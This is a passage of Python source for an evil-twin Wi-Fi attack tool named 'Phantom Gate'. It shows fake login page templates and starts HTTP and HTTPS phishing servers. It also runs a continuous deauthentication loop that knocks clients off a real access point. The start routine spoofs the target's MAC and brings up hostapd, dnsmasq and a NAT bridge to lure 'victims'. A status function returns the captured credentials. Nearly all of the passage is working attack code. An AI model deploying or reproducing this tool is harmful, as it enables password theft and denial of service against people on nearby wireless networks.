            <form method="POST" action="/login">
                <input type="text" name="email" placeholder="Email address or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="btn">Log In</button>
            </form>
            <a href="#" class="forgot">Forgotten password?</a>
            <div class="divider"></div>
            <a href="#" class="create">Create New Account</a>
        </div>
    </div>
</body>
</html>'''
    
    def _debug_template(self) -> str:
        """DEBUG template - obvious for testing, shows bright purple warning."""
        state = get_portal_state()
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>👻 PHANTOM GATE ACTIVE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{ font-family: monospace; background: linear-gradient(135deg, #6B2D8B 0%, #2E1A47 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; animation: pulse 2s infinite; }}
        @keyframes pulse {{ 0%, 100% {{ opacity: 1; }} 50% {{ opacity: 0.8; }} }}
        .container {{ background: rgba(0,0,0,0.85); padding: 40px; border-radius: 16px; border: 3px solid #C084FC; box-shadow: 0 0 60px rgba(192, 132, 252, 0.5); max-width: 500px; width: 90%; }}
        .warning {{ text-align: center; font-size: 64px; margin-bottom: 20px; animation: float 2s ease-in-out infinite; }}
        @keyframes float {{ 0%, 100% {{ transform: translateY(0); }} 50% {{ transform: translateY(-10px); }} }}
        h1 {{ font-size: 28px; color: #C084FC; text-align: center; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 3px; }}
        .status {{ color: #A855F7; font-size: 14px; text-align: center; margin-bottom: 24px; }}
        .info {{ background: #1A0A2E; border: 1px solid #7C3AED; padding: 16px; border-radius: 8px; margin-bottom: 20px; color: #E9D5FF; font-size: 12px; line-height: 1.6; }}
        .info strong {{ color: #C084FC; }}
        input {{ width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 2px solid #7C3AED; border-radius: 8px; font-size: 16px; background: #0D0118; color: #E9D5FF; font-family: monospace; }}
        input:focus {{ outline: none; border-color: #C084FC; box-shadow: 0 0 20px rgba(192, 132, 252, 0.4); }}
        input::placeholder {{ color: #6B21A8; }}
        .btn {{ width: 100%; padding: 16px; background: linear-gradient(135deg, #7C3AED 0%, #6B2D8B 100%); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }}
        .btn:hover {{ box-shadow: 0 0 30px rgba(124, 58, 237, 0.6); transform: scale(1.02); }}
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">👻</div>
        <h1>PHANTOM GATE ACTIVE</h1>
        <p class="status">Evil Twin: {state.target_essid or 'Unknown'} (CH{state.target_channel})</p>
        <div class="info">
            <strong>DEBUG MODE</strong><br>
            This page intercepts ALL traffic.<br>
            Target BSSID: {state.target_bssid or 'N/A'}<br>
            Captured so far: {len(state.captured_credentials)} credentials
        </div>
        <form method="POST" action="/login">
            <input type="text" name="email" placeholder="Enter email/username" required autofocus>
            <input type="password" name="password" placeholder="Enter password" required>
            <button type="submit" class="btn">Submit Credentials</button>
        </form>
    </div>
</body>
</html>'''


def start_portal_server(port: int = 80, https_port: int = 443, 
                        portal_type: str = 'google') -> HTTPServer:
    """Start the phishing portal HTTP and HTTPS servers."""
    state = get_portal_state()
    
    # Configure handler
    PhishingHandler.portal_type = portal_type
    PhishingHandler.forced_mode = state.forced_mode
    
    # Start HTTP server on port 80
    try:
        http_server = HTTPServer(('0.0.0.0', port), PhishingHandler)
        state.portal_server = http_server
        state.portal_thread = threading.Thread(target=http_server.serve_forever)
        state.portal_thread.daemon = True
        state.portal_thread.start()
        portal_log(f"HTTP phishing server started on :{port}")
    except Exception as e:
        portal_log(f"Failed to start HTTP server: {e}", "error")
        return None
    
    # Start HTTPS server on port 443 (required for modern sites)
    if https_port and state.ssl_cert and state.ssl_key:
        try:
            https_server = HTTPServer(('0.0.0.0', https_port), PhishingHandler)
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(state.ssl_cert, state.ssl_key)
            https_server.socket = context.wrap_socket(https_server.socket, server_side=True)
            
            state.https_server = https_server
            state.https_thread = threading.Thread(target=https_server.serve_forever)
            state.https_thread.daemon = True
            state.https_thread.start()
            portal_log(f"HTTPS phishing server started on :{https_port}")
        except Exception as e:
            portal_log(f"Failed to start HTTPS server: {e}", "warning")
            # Continue with HTTP only
    else:
        portal_log("No SSL cert - HTTPS server not started", "warning")
    
    return http_server


def stop_portal_server():
    """Stop the portal HTTP and HTTPS servers."""
    state = get_portal_state()
    
    if state.portal_server:
        state.portal_server.shutdown()
        state.portal_server = None
        portal_log("HTTP server stopped")
    
    if hasattr(state, 'https_server') and state.https_server:
        state.https_server.shutdown()
        state.https_server = None
        portal_log("HTTPS server stopped")


# ─────────────────────────────────────────────────────────────────
# Deauth Loop (kicks clients off real AP)
# ─────────────────────────────────────────────────────────────────

def start_deauth_loop(interface: str, bssid: str, channel: str) -> bool:
    """
    Start continuous deauthentication of clients from real AP.
    Uses Python thread and Scapy (or aireplay-ng fallback).
    """
    state = get_portal_state()
    
    # Check for hardware contention
    if interface == state.out_interface:
        portal_log(f"WARNING: Deauth and AP sharing same interface {interface}. This may be unstable!", "warning")
    
    state.deauth_stop.clear()
    
    def _deauth_worker():
        from memento import PYTHON_DEAUTH_AVAILABLE
        # Import here to avoid circular dependencies if any
        try:
            from app.deauth import send_deauth_packets
        except ImportError:
            try:
                from .deauth import send_deauth_packets
            except ImportError:
                def send_deauth_packets(*args, **kwargs): return False
        
        # Use pressure from settings
        app_state = get_state()
        count = app_state.settings.get('deauth_count', 16)
        
        portal_log(f"Deauth loop thread started (Pressure: {count})")
        
        # Set channel once
        subprocess.run(['iw', 'dev', interface, 'set', 'channel', str(channel)], check=False)
        
        while not state.deauth_stop.is_set():
            if PYTHON_DEAUTH_AVAILABLE:
                # Use Scapy deauther
                send_deauth_packets(interface, bssid, count=count, verbose=False)
            else:
                # Fallback to aireplay-ng
                subprocess.run(['aireplay-ng', '--deauth', str(count // 2 or 1), '-a', bssid, interface], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Dynamic sleep based on pressure - be blunt and aggressive
            # count map: 8=Gentle, 16=Firm, 32=Heavy, 64=Brutal
            sleep_time = 1.0 if count <= 8 else (0.2 if count <= 16 else 0.01)
            if state.deauth_stop.wait(sleep_time):
                break
                
        portal_log("Deauth loop thread stopped")

    state.deauth_thread = threading.Thread(target=_deauth_worker, daemon=True)
    state.deauth_thread.start()
    return True


def stop_deauth_loop():
    """Stop the deauth loop thread."""
    state = get_portal_state()
    
    if state.deauth_thread:
        state.deauth_stop.set()
        state.deauth_thread.join(timeout=2)
        state.deauth_thread = None
    
    if state.deauth_proc:
        try:
            # Safer kill - no killpg
            state.deauth_proc.terminate()
            state.deauth_proc.wait(timeout=2)
        except:
            try: state.deauth_proc.kill()
            except: pass
        state.deauth_proc = None
        print("[+] Deauth loop stopped")


# ─────────────────────────────────────────────────────────────────
# Main Portal Control
# ─────────────────────────────────────────────────────────────────

def start_portal(
    essid: str,
    bssid: str,
    channel: str,
    in_interface: str,
    out_interface: str,
    mode: str = 'open',
    password: str = None,
    strategy: str = 'karma',
    capture_traffic: bool = True,
    clone_bssid: bool = True,
    deauth: bool = False,
    deauth_interface: str = None,
) -> bool:
    """
    Start the Evil Twin portal.
    
    Args:
        essid: Target network name
        bssid: Target AP's MAC address
        channel: Channel to operate on
        in_interface: Internet source interface
        out_interface: Wireless interface for Evil Twin
        mode: 'open' for captive portal, 'wpa2' for password-protected
        password: WPA2 password (required if mode='wpa2')
        strategy: 'karma', 'stealth', or 'passive'
        capture_traffic: Save traffic to pcap
        clone_bssid: Clone target's MAC address
        deauth: Enable continuous deauth against real AP
        deauth_interface: Interface for deauth (defaults to out_interface)
    
    Returns:
        True if portal started successfully
    """
    state = get_portal_state()
    
    if state.active:
        print("[!] Portal already active. Stop it first.")
        return False
    
    # Validate interfaces exist
    if not os.path.exists(f'/sys/class/net/{in_interface}'):
        portal_log(f"Internet interface '{in_interface}' does not exist!", "error")
        return False
    
    if not os.path.exists(f'/sys/class/net/{out_interface}'):
        portal_log(f"Evil Twin interface '{out_interface}' does not exist - is adapter plugged in?", "error")
        return False
    
    portal_log(f"Starting Phantom Gate for '{essid}' on channel {channel}")
    portal_log(f"Internet: {in_interface} | Evil Twin: {out_interface}")
    
    # Store target info
    state.target_essid = essid
    state.target_bssid = bssid
    state.target_channel = channel
    state.mode = mode
    state.password = password
    state.strategy = strategy
    state.in_interface = in_interface
    state.out_interface = out_interface
    state.deauth_enabled = deauth
    state.forced_mode = (strategy == 'karma') # Backwards compat flag for PhishingHandler
    
    try:
        # 0. Prep Interface (Stability Fixes)
        portal_log("Step 0/8: Preparing interface (stopping interference)...")
        unblock_rfkill()
        set_nm_managed(out_interface, managed=False)
        
        # Bring down for config
        subprocess.run(['ip', 'link', 'set', out_interface, 'down'], check=False)
        time.sleep(1)  # Wait for release
        
        # 1. Clone BSSID (MAC spoof)
        if clone_bssid:
            portal_log(f"Step 1/8: Spoofing MAC to match {bssid}...")
            if not spoof_mac(out_interface, bssid):
                portal_log("MAC spoofing failed, continuing anyway...", "warning")
            else:
                portal_log("MAC spoofed successfully", "success")
        else:
            portal_log("Step 1/8: Skipping MAC spoof (disabled)")
        
        # 2. Generate SSL cert
        portal_log("Step 2/8: Generating SSL certificate...")
        cert, key = generate_ssl_cert()
        state.ssl_cert = cert
        state.ssl_key = key
        portal_log("SSL certificate ready")
        
        # 3. Start hostapd
        portal_log(f"Step 3/8: Starting hostapd ({mode} mode)...")
        hostapd_conf = generate_hostapd_conf(out_interface, essid, channel, mode, password)
        if not start_hostapd(hostapd_conf):
            raise Exception("hostapd failed to start")
        portal_log("hostapd broadcasting AP", "success")
        
        # Wait for hostapd to initialize
        portal_log("Waiting for AP to initialize...")
        time.sleep(2)
        
        # 4. Configure NAT bridge
        portal_log(f"Step 4/8: Configuring NAT bridge ({strategy} mode)...")
        if not setup_nat_bridge(in_interface, out_interface, strategy):
            raise Exception("NAT configuration failed")
        portal_log("NAT bridge configured", "success")
        
        # 5. Start dnsmasq
        portal_log(f"Step 5/8: Starting dnsmasq ({strategy} mode)...")
        dnsmasq_conf = generate_dnsmasq_conf(out_interface, strategy)
        if not start_dnsmasq(dnsmasq_conf):
            raise Exception("dnsmasq failed to start")
        portal_log("dnsmasq serving DHCP/DNS", "success")
        
        # 6. Start portal server
        portal_log("Step 6/8: Starting HTTP phishing server on :80...")
        if not start_portal_server():
            raise Exception("Portal server failed to start")
        portal_log("Phishing server ready", "success")
        
        # 7. Start traffic capture
        if capture_traffic:
            portal_log(f"Step 7/8: Starting traffic capture on {out_interface}...")
            start_traffic_capture(out_interface)
            portal_log("Traffic capture active (see captures/)", "success")
        else:
            portal_log("Step 7/8: Traffic capture disabled")
        
        # 8. Start deauth loop if enabled
        if deauth:
            deauth_iface = deauth_interface or out_interface
            
            # BLUNT HARDWARE CHECK
            if deauth_iface == out_interface:
                portal_log("!!! BLUNT WARNING: One adapter for AP + Deauth = Instability.", "warning")
                portal_log("Portals need strict timing (Beacons). Deauth injection breaks that timing.")
                portal_log("Clients will likely drop or the portal will lag into oblivion.", "warning")
            
            portal_log(f"Step 8/8: Starting deauth loop on {deauth_iface} against {bssid}...")
            start_deauth_loop(deauth_iface, bssid, channel)
            portal_log("Deauth loop active", "success")
        else:
            portal_log("Step 8/8: Deauth disabled")
        
        state.active = True
        portal_log(f"✓ PORTAL ACTIVE - '{essid}' on CH{channel} waiting for victims", "success")
        return True
        
    except Exception as e:
        portal_log(f"Portal startup FAILED: {e}", "error")
        stop_portal()  # Cleanup partial startup
        return False


def stop_portal() -> bool:
    """Stop the Evil Twin portal and cleanup."""
    state = get_portal_state()
    
    portal_log("Stopping Phantom Gate...")
    
    # Stop all services with aggressive cleanup
    portal_log("Stopping deauth loop...")
    stop_deauth_loop()
    
    portal_log("Stopping portal server...")
    stop_portal_server()
    
    portal_log("Stopping traffic capture...")
    stop_traffic_capture()
    
    portal_log("Stopping dnsmasq...")
    stop_dnsmasq()
    # Kill any orphan dnsmasq processes
    subprocess.run(['pkill', '-9', '-f', 'dnsmasq.*phantomgate'], capture_output=True)
    
    portal_log("Stopping hostapd...")
    stop_hostapd()
    # Kill any orphan hostapd processes
    subprocess.run(['pkill', '-9', '-f', 'hostapd.*phantomgate'], capture_output=True)
    
    portal_log("Cleaning up NAT rules...")
    cleanup_nat()
    
    # Reset interface more aggressively
    out_iface = state.out_interface  # Save before clearing
    if out_iface:
        portal_log(f"Aggressively resetting interface {out_iface}...")
        try:
            # Flush IP addresses
            subprocess.run(['ip', 'addr', 'flush', 'dev', out_iface], check=False)
            
            # Bring down
            subprocess.run(['ip', 'link', 'set', out_iface, 'down'], check=False)
            time.sleep(0.3)
            
            # Use iw to set back to managed mode (clears AP mode state)
            subprocess.run(['iw', 'dev', out_iface, 'set', 'type', 'managed'], 
                          capture_output=True, check=False)
            time.sleep(0.3)
            
            # Bring back up
            subprocess.run(['ip', 'link', 'set', out_iface, 'up'], check=False)
            time.sleep(0.5)
            
            portal_log(f"Interface {out_iface} reset to managed mode", "success")
        except Exception as e:
            portal_log(f"Interface reset error: {e}", "warning")
            
    # Restore NetworkManager management
    if state.out_interface:
         set_nm_managed(state.out_interface, managed=True)
    
    # Restore MAC
    if state.original_mac and state.out_interface:
        portal_log(f"Restoring MAC to {state.original_mac}...")
        restore_mac()
        # Bring interface back up after MAC restore
        subprocess.run(['ip', 'link', 'set', state.out_interface, 'up'], check=False)
    
    # Clean up temp SSL files
    for path in [state.ssl_cert, state.ssl_key]:
        if path and os.path.exists(path):
            os.unlink(path)
    state.ssl_cert = None
    state.ssl_key = None
    
    # Reset state
    state.active = False
    state.out_interface = None
    state.in_interface = None
    
    portal_log("✓ Phantom Gate stopped", "success")
    return True


def get_portal_status() -> Dict[str, Any]:
    """Get current portal status for API."""
    state = get_portal_state()
    
    return {
        'active': state.active,
        'target_essid': state.target_essid,
        'target_bssid': state.target_bssid,
        'target_channel': state.target_channel,
        'mode': state.mode,
        'portal_type': state.portal_type,
        'strategy': state.strategy,
        'forced_mode': state.strategy == 'karma', # Compat
        'spoofed_mac': state.spoofed_mac,
        'credentials_captured': len(state.captured_credentials),
        'credentials': state.captured_credentials[-10:],  # Last 10
        'connected_clients': state.connected_clients,
    }
